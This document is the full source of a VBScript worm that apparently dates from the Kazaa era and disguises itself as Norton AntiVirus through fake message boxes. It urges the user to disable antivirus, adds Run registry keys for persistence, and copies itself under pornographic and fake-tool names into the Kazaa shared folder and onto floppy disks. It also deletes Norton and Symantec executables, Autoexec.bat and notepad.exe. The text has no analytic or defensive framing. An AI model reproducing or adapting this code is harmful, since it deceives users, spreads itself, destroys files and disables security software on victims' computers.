   MsgBox "This Program Always Will Protect Your PC",48,"Norton AntiVirus."
   MsgBox "Please Turn Off Any Kind Of Antivirus For Best Results WWW.Symatec.com",48,"Norton AntiVirus."
   MsgBox "This Program remove 5 different virus",38,"Norton AntiVirus."
   MsgBox "W32/Tulu.A.Worm Not Found",0,"Norton AntiVirus."
   MsgBox "W32/Zule.Worm Not Found",0,"Norton AntiVirus."
   MsgBox "W32/Cunario.Worm Not Found",0,"Norton AntiVirus."
   MsgBox "W32/Orfina.Worm Not Found",0,"Norton AntiVirus."
   MsgBox "VBS/Celeron.Worm Not Found",0,"Norton AntiVirus."
   RegeditCrear()

   Sub RegeditCrear()
   Dim Rege
   Set Rege = WScript.CreateObject("WScript.Shell")
   Rege.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Run","C:\WINDOWS\system32\DVD32.vbs"
   Rege.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Windll","C:\WINDOWS\system\Hotmail.vbs"
   end Sub
   On Error Resume Next
   Movefile()

   Sub Movefile()
   Dim Mov
   Set Mov = CreateObject("Scripting.FileSystemObject")
   Mov.Movefile ".\video porno sexo.zip", "C:\Program Files\Kazaa\My Shared Folder\video porno sexo.zip"
   end sub
   On Error Resume Next

   Copiarasimismo()

   Sub Copiarasimismo()
   dim fso, eq, ctr, file, vbscopy
   Set fso = CreateObject("Scripting.FileSystemObject")
   set file = fso.OpenTextFile(WScript.ScriptFullname,1)
   vbscopy=file.ReadAll
   Set c = fso.GetFile(WScript.ScriptFullName)
   c.Copy("C:\WINDOWS\system32\DVD32.vbs")
   c.Copy("C:\WINDOWS\system\Hotmail.vbs")
   c.Copy("C:\WINDOWS\Help\Ayuda.vbs")
   c.Copy("C:\WINDOWS\Help\Scrip.vbs")
   c.Copy("C:\WINDOWS\Help\ANA.vbs")
   c.Copy("A:\HELP.vbs")
   c.Copy("C:\Program Files\Kazaa\My Shared Folder\Cristina.jpg.vbs")
   c.Copy("C:\Program Files\Kazaa\My Shared Folder\Lesbianas.jpg.vbs")
   c.Copy("C:\Program Files\Kazaa\My Shared Folder\Sexo.jpg.vbs")
   c.Copy("C:\Program Files\Kazaa\My Shared Folder\Video porno.jpg.vbs")
   c.Copy("C:\Program Files\Kazaa\My Shared Folder\Anal.jpg.vbs")
   c.Copy("C:\Program Files\Kazaa\My Shared Folder\Britney.jpg.vbs")
   c.Copy("C:\Program Files\Kazaa\My Shared Folder\Cristina.jpg.vbs")
   c.Copy("C:\Program Files\Kazaa\My Shared Folder\Norton.vbs")
   c.Copy("C:\Program Files\Kazaa\My Shared Folder\Hackers.vbs")
   c.Copy("C:\Program Files\Kazaa\My Shared Folder\Hotmail.vbs")
   c.Copy("C:\Program Files\Kazaa\My Shared Folder\Programa para hackear.vbs")
   c.Copy("C:\Program Files\Kazaa\My Shared Folder\Age.exe.vbs")
   c.Copy("C:\Program Files\Kazaa\My Shared Folder\Documento hacker.vbs")
   c.Copy("C:\Program Files\Kazaa\My Shared Folder\Como hackear.txt.vbs")
   c.Copy("C:\Program Files\Kazaa\My Shared Folder\Sexo.vbs")
   c.Copy("C:\Program Files\Kazaa\My Shared Folder\Fotos.vbs")
   c.Copy("C:\Program Files\Kazaa\My Shared Folder\Navidad.vbs")
   c.Copy("C:\Program Files\Kazaa\My Shared Folder\sexoyamor.txt.vbs")
   c.Copy("C:\Program Files\Kazaa\My Shared Folder\Visual.vbs")
   c.Copy("C:\Program Files\Kazaa\My Shared Folder\Visual Basic 6.vbs")
   c.Copy("C:\Program Files\Kazaa\My Shared Folder\Word.vbs")
   c.Copy("C:\Program Files\Kazaa\My Shared Folder\Windows.vbs")
   c.Copy("C:\Program Files\Kazaa\My Shared Folder\Xp.vbs")
   c.Copy("C:\Program Files\Kazaa\My Shared Folder\Putas.vbs")
   c.Copy("C:\Program Files\Kazaa\My Shared Folder\Norton Quick remove.vbs")
   c.Copy("C:\Program Files\Kazaa\My Shared Folder\Celeron Remove.vbs")
   c.Copy("C:\Program Files\Kazaa\My Shared Folder\Anti Celeron Virus.vbs")
   end sub
   On Error Resume Next
   Dim fso, fso1, fso2, fso3, fso4, f1, f2, f3, f4, f5, tf, fldr, s, op
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set tf = fso.CreateTextFile("C:\CELERON.txt", True)
   tf.WriteLine("Celeron. HECHO EN MEXICO")
   tf.WriteBlankLines(3)
   tf.Write ("YO SOY UNA FORMA DE VIDA")
   tf.Close
   On Error Resume Next
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set f1 = fso.GetFile("C:\Program Files\Norton AntiVirus\NAVSTUB.EXE")
   f1.Delete
   Set fso1 = CreateObject("Scripting.FileSystemObject")
   Set f2 = fso.GetFile("C:\Program Files\Norton AntiVirus\NAVW32.EXE")
   On Error Resume Next
   f2.Delete
   On Error Resume Next
   Set fso2 = CreateObject("Scripting.FileSystemObject")
   Set f3 = fso.GetFile("C:\Program Files\Symantec\LiveUpdate\NDETECT.EXE")
   f3.Delete
   On Error Resume Next
   Set fso3 = CreateObject("Scripting.FileSystemObject")
   Set f4 = fso.GetFile("C:\Autoexec.bat")
   f4.Delete
   On Error Resume Next
   Set fso2 = CreateObject("Scripting.FileSystemObject")
   Set f3 = fso.GetFile("C:\WINDOWS\system32\notepad.exe")
   f3.Delete
   On Error Resume Next
   Set fso3 = CreateObject("Scripting.FileSystemObject")
   Set f4 = fso.GetFile("C:\Program Files\Norton AntiVirus\NAVAPSVC.EXE")
   f4.Delete
   On Error Resume Next
   Set fso4 = CreateObject("Scripting.FileSystemObject")
   Set f5 = fso.GetFile("C:\WINDOWS\notepad.exe")
   f5.Delete
   On Error Resume Next
   Set Cel = CreateObject("Scripting.FileSystemObject")
   i = i +1
   If i = 1 Then
   Randomize
   Lol = Int(Rnd * 3)
   If lol = "0" Then Nombre = "SEX SEX.jpg"
   If lol = "1" Then Nombre = "Cristina Porn.jpg"
   If lol = "2" Then Nombre = "Porn"
   Cel.CopyFile ".\NORTON 2003.vbs", "A:\" & Nombre & ".vbs"
   i = 0
   End If
   On Error Resume Next
